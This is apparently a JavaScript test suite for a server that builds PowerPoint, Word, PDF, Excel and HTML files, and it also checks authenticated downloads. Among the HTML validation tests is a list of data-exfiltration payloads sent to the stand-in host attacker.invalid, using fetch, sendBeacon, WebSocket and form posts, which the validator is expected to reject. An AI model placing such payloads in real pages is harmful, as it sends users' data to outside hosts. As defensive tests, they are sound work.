/**
 * G1 验收测试:服务端真实生成 PPT/Word/Excel
 * — 调用 createPptx/createDocx/createXlsx → 验返回 metadata + 文件落盘 + zip 可解析
 */
import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import JSZip from 'jszip'
import { PDFDocument, PDFName } from 'pdf-lib'
import sharp from 'sharp'
import '../scripts/testEnvironment.mjs'

// 用临时目录,跑完清理
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'artifact-test-'))
process.env.ARTIFACT_DIR = TMP
process.env.APP_DATA_DIR = path.join(os.tmpdir(), 'yma-artifact-tests', String(process.pid))

const { createAppServer } = await import('../server/appServer.js')
const { buildArtifactFilename, createHtmlArtifact, createPptx, createDocx, createPdf, createXlsx, getArtifactDir, validateHtmlArtifactSource } = await import('../server/services/artifactGen.js')
const { resolveOfficeArtifactImageInputs } = await import('../server/services/officeArtifactImages.js')
const { setAllFilesAccess } = await import('../server/services/localFileAccessService.js')
const { issueTestSession } = await import('./helpers/testAuth.js')

async function loadPptxZip(result) {
  return JSZip.loadAsync(fs.readFileSync(result.fullPath || path.join(getArtifactDir(), result.filename)))
}

async function loadSlideXml(result, slideNo) {
  const zip = await loadPptxZip(result)
  return zip.file(`ppt/slides/slide${slideNo}.xml`).async('string')
}

async function loadFirstChartXml(result) {
  const zip = await loadPptxZip(result)
  const chartFile = Object.keys(zip.files).find((n) => /^ppt\/charts\/chart\d+\.xml$/.test(n))
  assert.ok(chartFile, 'pptx 应生成 chart xml')
  return zip.file(chartFile).async('string')
}

function countNonTextShapes(slideXml) {
  return (slideXml.match(/<p:sp>[\s\S]*?<\/p:sp>/g) || [])
    .filter((part) => !part.includes('<p:txBody>'))
    .length
}

test('createPptx 真实生成可解析的 OOXML pptx', async () => {
  const result = await createPptx({
    title: '季度汇报',
    slides: [
      { title: '封面', bullets: ['Q1 总结', '增长 23%'] },
      { title: '亮点', bullets: ['客户 A', '客户 B'] },
    ],
  })
  assert.equal(result.type, 'pptx')
  assert.ok(result.url.startsWith('/api/artifacts/'), 'url 应是 /api/artifacts/ 路径')
  assert.match(result.filename, /\.pptx$/)
  assert.ok(result.byteLength > 1000, `pptx 应 > 1kb,实际 ${result.byteLength}`)

  // 文件真落盘
  const full = path.join(getArtifactDir(), result.filename)
  assert.ok(fs.existsSync(full), '文件应已写入 artifact 目录')

  // JSZip 能解析,且含 ppt/presentation.xml
  const zip = await JSZip.loadAsync(fs.readFileSync(full))
  assert.ok(zip.file('ppt/presentation.xml'), 'pptx 应含 ppt/presentation.xml')
})

test('createPptx 暴露可复现时间与安全的 CJK 字体注入回执', async () => {
  const generatedAt = '2024-05-06T07:08:09.000Z'
  const result = await createPptx({
    title: '可观测回执',
    generatedAt,
    slides: [{ title: '封面', layout: 'cover' }],
  })

  assert.equal(result.generatedAt, generatedAt)
  assert.deepEqual(result.fontInjection, {
    status: 'injected',
    font: 'Microsoft YaHei',
  })
  assert.equal(JSON.stringify(result.fontInjection).includes('ppt/theme'), false)
})

test('cover/section 为所有 premium theme 渲染受控 gradient 装饰', async () => {
  for (const theme of ['noir', 'paper', 'ocean', 'forest']) {
    const result = await createPptx({
      title: `${theme} 视觉测试`,
      subtitle: 'gradient sanity',
      theme,
      brand: 'YMA',
      slides: [
        { title: '封面' },
        { title: '章节一', layout: 'section', eyebrow: 'SECTION' },
      ],
    })
    const coverXml = await loadSlideXml(result, 1)
    assert.equal((coverXml.match(/prst="ellipse"/g) || []).length, 2, `${theme} cover 应有 2 个 vignette 椭圆`)
    assert.equal((coverXml.match(/rot="1500000"/g) || []).length, 1, `${theme} cover 应有 1 条 25° accent stripe`)
    assert.ok(countNonTextShapes(coverXml) <= 5, `${theme} cover 背景/线条元素应受控`)

    const sectionXml = await loadSlideXml(result, 2)
    assert.ok((sectionXml.match(/<a:alpha val="30000"\/>/g) || []).length >= 1, `${theme} section 应有 70% 透明数字阴影`)
    assert.ok((sectionXml.match(/prst="rect"/g) || []).length >= 5, `${theme} section 应含 panel gradient 和双 hairline`)
    assert.ok(countNonTextShapes(sectionXml) <= 5, `${theme} section 背景/线条元素应受控`)
  }
})

test('bar-stacked chart 写入 stacked grouping XML', async () => {
  const result = await createPptx({
    title: '收入构成',
    slides: [
      { title: '封面' },
      {
        title: '收入构成',
        layout: 'chart',
        chart: {
          type: 'bar-stacked',
          categories: ['Q1', 'Q2', 'Q3'],
          series: [
            { name: '订阅', values: [60, 72, 85] },
            { name: '服务', values: [20, 24, 28] },
          ],
        },
      },
    ],
  })
  const chartXml = await loadFirstChartXml(result)
  assert.ok(chartXml.includes('<c:grouping val="stacked"/>'), 'bar-stacked 应输出 stacked grouping')
})

test('旧 bar chart 保持非 stacked 行为', async () => {
  const result = await createPptx({
    title: '收入对比',
    slides: [
      { title: '封面' },
      {
        title: '收入对比',
        layout: 'chart',
        chart: {
          type: 'bar',
          categories: ['Q1', 'Q2'],
          series: [
            { name: '今年', values: [100, 120] },
            { name: '去年', values: [80, 95] },
          ],
        },
      },
    ],
  })
  const chartXml = await loadFirstChartXml(result)
  assert.ok(!chartXml.includes('<c:grouping val="stacked"/>'), '旧 bar 不应变成 stacked')
})

test('createPptx slides 为空时报错', async () => {
  await assert.rejects(() => createPptx({ title: 't', slides: [] }), /slides/)
})

test('createDocx 真实生成 OOXML docx', async () => {
  const result = await createDocx({
    title: '会议纪要',
    paragraphs: [
      { heading: 1, text: '议题' },
      { text: '讨论了 Q1 路线图' },
      { heading: 2, text: '决议' },
      { text: '客户 A 续约' },
    ],
  })
  assert.equal(result.type, 'docx')
  assert.match(result.filename, /\.docx$/)
  assert.ok(result.byteLength > 500, `docx 应 > 500 字节,实际 ${result.byteLength}`)

  const full = path.join(getArtifactDir(), result.filename)
  const zip = await JSZip.loadAsync(fs.readFileSync(full))
  assert.ok(zip.file('word/document.xml'), '应含 word/document.xml')
  assert.ok(zip.file('[Content_Types].xml'), '应含 Content_Types')
  const doc = await zip.file('word/document.xml').async('string')
  assert.ok(doc.includes('议题'), 'document.xml 应含正文文本')
  assert.ok(doc.includes('会议纪要'), '应含 title 作为 H1')
})

test('createDocx paragraphs 为空时报错', async () => {
  await assert.rejects(() => createDocx({ title: 't', paragraphs: [] }), /paragraphs/)
})

test('createPdf 真实生成带中文字体和页码的 PDF', async () => {
  const result = await createPdf({
    title: '中文项目总结',
    blocks: [
      { type: 'heading', text: '完成情况' },
      { type: 'paragraph', text: '无需技能即可直接生成真实 PDF 文件。' },
      { type: 'bullet', text: '支持自动分页、换行和中文字体' },
    ],
  })
  const bytes = fs.readFileSync(result.fullPath)
  assert.equal(bytes.subarray(0, 5).toString(), '%PDF-')
  assert.equal(result.type, 'pdf')
  assert.equal(result.pageCount, 1)
  assert.ok(result.byteLength > 1_000)
})

test('createPdf 把授权图片嵌入为真实 PDF image XObject', async () => {
  const sourcePath = path.join(TMP, 'pdf-source-image.png')
  await sharp({
    create: {
      width: 64,
      height: 32,
      channels: 4,
      background: { r: 12, g: 88, b: 220, alpha: 1 },
    },
  }).png().toFile(sourcePath)

  const { userId } = issueTestSession()
  setAllFilesAccess({ userId, enabled: true, confirmation: 'ALLOW_ALL_LOCAL_FILES' })
  const images = resolveOfficeArtifactImageInputs(
    [{ path: sourcePath, alt: '实际蓝色图片' }],
    { userId },
  )

  const result = await createPdf({
    title: '原图转 PDF',
    images,
    userId,
  })
  const bytes = fs.readFileSync(result.fullPath)
  const document = await PDFDocument.load(bytes, { updateMetadata: false })
  const page = document.getPage(0)
  const xObjects = page.node.Resources().lookup(PDFName.of('XObject'))

  assert.equal(result.type, 'pdf')
  assert.equal(result.pageCount, 1)
  assert.equal(result.imageCount, 1)
  assert.ok(xObjects, 'PDF page resources must contain an XObject dictionary')
  const imageObjects = xObjects.keys().map((key) => xObjects.lookup(key))
    .filter((object) => object?.dict?.get(PDFName.of('Subtype'))?.toString() === '/Image')
  assert.equal(imageObjects.length, 1)
  assert.equal(imageObjects[0].dict.get(PDFName.of('Width')).asNumber(), 64)
  assert.equal(imageObjects[0].dict.get(PDFName.of('Height')).asNumber(), 32)
})

test('createXlsx 真实生成 SpreadsheetML', async () => {
  const result = await createXlsx({
    sheets: [
      {
        name: '销售',
        rows: [
          ['月份', '收入', '增长'],
          ['1月', 100, '10%'],
          ['2月', 120, '20%'],
        ],
      },
    ],
  })
  assert.equal(result.type, 'xlsx')
  assert.match(result.filename, /\.xlsx$/)
  assert.equal(result.sheetCount, 1)
  assert.equal(result.rowCount, 3)

  const full = path.join(getArtifactDir(), result.filename)
  const zip = await JSZip.loadAsync(fs.readFileSync(full))
  assert.ok(zip.file('xl/workbook.xml'), '应含 xl/workbook.xml')
  assert.ok(zip.file('xl/worksheets/sheet1.xml'), '应含 sheet1')
  const sheet = await zip.file('xl/worksheets/sheet1.xml').async('string')
  assert.ok(sheet.includes('月份'), 'sheet1 应含表头文本')
  assert.ok(sheet.includes('<v>100</v>'), 'sheet1 应含数字 cell')
})

test('createXlsx 全空 sheets 报错', async () => {
  await assert.rejects(
    () => createXlsx({ sheets: [{ name: 's', rows: [] }] }),
    /sheets\[0\]\.rows must contain at least one row/,
  )
})

test('createXlsx snapshots worksheet input before asynchronous image preparation', async () => {
  const sheets = [{ name: 'Original', rows: [['001']] }]
  const pending = createXlsx({ title: 'Snapshot', sheets })
  sheets[0].name = 'Mutated'
  sheets[0].rows[0][0] = '999'

  const result = await pending
  const zip = await JSZip.loadAsync(fs.readFileSync(result.fullPath))
  const workbook = await zip.file('xl/workbook.xml').async('string')
  const worksheet = await zip.file('xl/worksheets/sheet1.xml').async('string')
  assert.match(workbook, /name="Original"/)
  assert.doesNotMatch(workbook, /Mutated/)
  assert.match(worksheet, />001<\/t>/)
  assert.doesNotMatch(worksheet, />999<\/t>/)
})

test('artifact 文件名格式安全(只含字母数字-.)', async () => {
  const r = await createPptx({ title: 'x', slides: [{ title: 'a', bullets: [] }] })
  assert.match(r.filename, /^[\w.-]+\.pptx$/, '文件名应只含安全字符')
})

test('HTML artifacts reject file-delivery instructions wrapped in valid tags', () => {
  const chineseHandoff = `<!doctype html><html><body><main><p>
    网页代码已生成。使用方式：1. 复制上面的完整代码；2. 新建文件，粘贴保存为 deepseek-v4-flash.html；
    3. 双击用浏览器打开即可。页面包含七个板块。
  </p></main></body></html>`
  const englishHandoff = `<!doctype html><html><body><main><p>
    The HTML code is ready. Copy the complete code, create a new file, save it as product.html,
    then open it in your browser.
  </p></main></body></html>`

  assert.throws(() => validateHtmlArtifactSource(chineseHandoff), /delivery instructions/i)
  assert.throws(() => createHtmlArtifact({ title: 'fake-page', html: englishHandoff }), /delivery instructions/i)
  assert.equal(fs.existsSync(path.join(getArtifactDir(), 'fake-page.html')), false)
})

test('HTML artifact validation keeps genuine compact webpages valid', () => {
  const html = `<!doctype html><html lang="zh-CN"><head><style>body{font-family:sans-serif}</style></head>
    <body><main><h1>DeepSeek V4 Flash</h1><section><h2>核心参数</h2><p>快速推理与长上下文。</p></section></main></body></html>`
  assert.equal(validateHtmlArtifactSource(html), html)
})

test('HTML artifact validation rejects unresolved managed attachment URIs', () => {
  const html = '<!doctype html><html><body style="background-image:url(attachment://attachment-123)"><main>Page</main></body></html>'
  assert.throws(() => validateHtmlArtifactSource(html), /unresolved attachment URI/i)
})

test('HTML artifact validation rejects local disk paths and undeclared managed assets', () => {
  const localPath = '<!doctype html><html><body><script>const basePath = "E:/果/"</script><main>Gallery</main></body></html>'
  const fileUri = '<!doctype html><html><body><img src="file:///E:/果/photo.jpg"><main>Gallery</main></body></html>'
  const managed = '<!doctype html><html><body><img src="gugo-asset://hero"><main>Gallery</main></body></html>'

  assert.throws(() => validateHtmlArtifactSource(localPath), /cannot reference a local disk path/i)
  assert.throws(() => validateHtmlArtifactSource(fileUri), /cannot reference a local disk path/i)
  assert.throws(() => validateHtmlArtifactSource(managed), /undeclared managed asset: hero/i)
  assert.equal(validateHtmlArtifactSource(managed, { assetIds: ['hero'] }), managed)
  assert.throws(
    () => validateHtmlArtifactSource(managed, { assetIds: ['hero', 'unused'] }),
    /declares an unused managed asset: unused/i,
  )
})

test('HTML artifact validation allows only explicitly trusted HTTPS image origins', () => {
  const remoteImageOrigins = ['https://images.example.test']
  const allowed = `<!doctype html><html><head></head><body><main>Gallery</main>
    <img src="https://images.example.test/hero.png">
    <picture><source srcset="https://images.example.test/hero-small.png 1x, https://images.example.test/hero-large.png 2x"><img src="data:image/gif;base64,AAAA"></picture>
    <video poster="https://images.example.test/poster.jpg"></video></body></html>`
  assert.equal(validateHtmlArtifactSource(allowed, { remoteImageOrigins }), allowed)

  const rejected = [
    '<img src="http://images.example.test/insecure.png">',
    '<img src="https://other.example.test/pixel.png">',
    '<script>fetch("https://images.example.test/data.json")</script>',
    '<script>const image = new Image(); image.src = "https://images.example.test/beacon.png"</script>',
    '<link rel="stylesheet" href="https://images.example.test/site.css">',
    '<iframe src="https://images.example.test/page.html"></iframe>',
  ]
  for (const body of rejected) {
    const html = `<!doctype html><html><head>${body}</head><body><main>Unsafe</main></body></html>`
    assert.throws(
      () => validateHtmlArtifactSource(html, { remoteImageOrigins }),
      /self-contained/i,
      body,
    )
  }
})

test('HTML artifact validation rejects remote resources, submissions, and network APIs', () => {
  const unsafeBodies = [
    '<img src="https://attacker.invalid/pixel.png">',
    '<img srcset="//attacker.invalid/a.png 1x, https://attacker.invalid/b.png 2x">',
    '<style>body{background:url(https://attacker.invalid/pixel.png)}</style>',
    '<style>@import "//attacker.invalid/theme.css";</style>',
    '<link rel="preload" href="https://attacker.invalid/font.woff2">',
    '<form action="https://attacker.invalid/collect"><input name="secret"></form>',
    '<button formaction="https://attacker.invalid/collect">Send</button>',
    '<meta http-equiv="refresh" content="0;url=https://attacker.invalid/">',
    '<script>fetch("https://attacker.invalid/collect")</script>',
    '<script>new XMLHttpRequest()</script>',
    '<script>new WebSocket("wss://attacker.invalid/socket")</script>',
    '<script>new EventSource("https://attacker.invalid/events")</script>',
    '<script>navigator.sendBeacon("https://attacker.invalid/collect", "x")</script>',
  ]

  for (const body of unsafeBodies) {
    const html = `<!doctype html><html><head>${body}</head><body><main>Unsafe</main></body></html>`
    assert.throws(() => validateHtmlArtifactSource(html), /self-contained/i, body)
  }

  const managed = '<!doctype html><html><head><style>.hero{background:url(gugo-asset://hero)}</style></head><body><form><img src="gugo-asset://hero"><main>Offline</main></form></body></html>'
  assert.equal(validateHtmlArtifactSource(managed, { assetIds: ['hero'] }), managed)
})

test('artifact filenames use the document title and increment duplicate names', async () => {
  assert.equal(buildArtifactFilename('项目总结', 'docx'), '项目总结.docx')
  assert.equal(buildArtifactFilename('NUL.txt', 'docx'), 'file-NUL.txt.docx')
  assert.equal(buildArtifactFilename('CON.backup', 'pdf'), 'file-CON.backup.pdf')
  assert.equal(buildArtifactFilename('COM1.log', 'xlsx'), 'file-COM1.log.xlsx')
  const first = await createDocx({ title: '项目总结', paragraphs: [{ text: '第一版' }] })
  const second = await createDocx({ title: '项目总结', paragraphs: [{ text: '第二版' }] })
  assert.equal(first.filename, '项目总结.docx')
  assert.equal(second.filename, '项目总结-2.docx')
  assert.doesNotMatch(first.filename, /\d{10,}|[a-f0-9]{16}|tool[_-]?call/i)
})

test('generated artifacts are downloadable from /api/artifacts/* with auth', async () => {
  // 起 mock OpenAI 兼容服务器(default executor 用 callBackgroundModel)
  const http = await import('node:http')
  const mockModel = http.createServer((req, res) => {
    let rawBody = ''
    req.setEncoding('utf8')
    req.on('data', (chunk) => { rawBody += chunk })
    req.on('end', () => {
      let payload = {}
      try { payload = JSON.parse(rawBody || '{}') } catch { /* malformed requests are handled below */ }
      const hasToolResult = Array.isArray(payload.messages)
        && payload.messages.some((message) => message?.role === 'tool')
      const message = hasToolResult
        ? { role: 'assistant', content: '测试文档已生成。' }
        : {
            role: 'assistant',
            content: '',
            tool_calls: [{
              id: 'artifact-download-docx',
              type: 'function',
              function: {
                name: 'create_docx',
                arguments: JSON.stringify({
                  title: '测试文档',
                  paragraphs: [{ text: '这是测试生成的内容。' }],
                }),
              },
            }],
          }
      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({
        choices: [{ message }],
      }))
    })
  })
  await new Promise((resolve) => mockModel.listen(0, '127.0.0.1', resolve))
  const mockPort = mockModel.address().port

  const { token } = issueTestSession()
  const server = createAppServer({ getEnv: () => ({
    MODEL_BASE_URL: `http://127.0.0.1:${mockPort}/v1`,
    MODEL_API_KEY: 'sk-test',
    MODEL_NAME: 'gpt-4o-mini',
  }) })
  // jobRuntime 通过 getRuntimeEnv() 读 env;测试里直接写 process.env
  process.env.MODEL_BASE_URL = `http://127.0.0.1:${mockPort}/v1`
  process.env.MODEL_API_KEY = 'sk-test'
  process.env.MODEL_NAME = 'gpt-4o-mini'
  process.env.MODEL_PROVIDERS = ''

  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
  const { port } = server.address()

  try {
    const createResp = await fetch(`http://127.0.0.1:${port}/api/jobs`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
      body: JSON.stringify({ prompt: '导出测试文档' }),
    })
    assert.equal(createResp.status, 201)
    const { job } = await createResp.json()

    let detail = null
    for (let i = 0; i < 100; i += 1) {
      const r = await fetch(`http://127.0.0.1:${port}/api/jobs/${job.id}`, {
        headers: { Authorization: `Bearer ${token}` },
      })
      detail = await r.json()
      if (detail.job.status === 'completed' || detail.job.status === 'failed') break
      await new Promise((res) => setTimeout(res, 50))
    }
    assert.equal(
      detail.job.status,
      'completed',
      `job status: ${detail?.job?.status}; error: ${detail?.job?.error || 'none'}; steps: ${JSON.stringify(detail?.job?.steps || [])}`,
    )
    assert.ok(detail.job.artifacts && detail.job.artifacts.length > 0, '应生成至少一个 artifact')
    const artifactUrl = detail.job.artifacts[0].url

    // 不带 token → 401
    const noAuth = await fetch(`http://127.0.0.1:${port}${artifactUrl}`)
    assert.equal(noAuth.status, 401)

    // 带 query token → 200
    const sep = artifactUrl.includes('?') ? '&' : '?'
    const withToken = await fetch(`http://127.0.0.1:${port}${artifactUrl}${sep}token=${token}`)
    assert.equal(withToken.status, 200)
    assert.match(withToken.headers.get('content-disposition') || '', /attachment;/)
    const bytes = new Uint8Array(await withToken.arrayBuffer())
    assert.ok(bytes.byteLength > 0)
  } finally {
    await new Promise((resolve) => server.close(resolve))
    await new Promise((resolve) => mockModel.close(resolve))
  }
})

// 跑完清理
test.after(() => {
  try { fs.rmSync(TMP, { recursive: true, force: true }) } catch { /* best-effort cleanup */ }
})
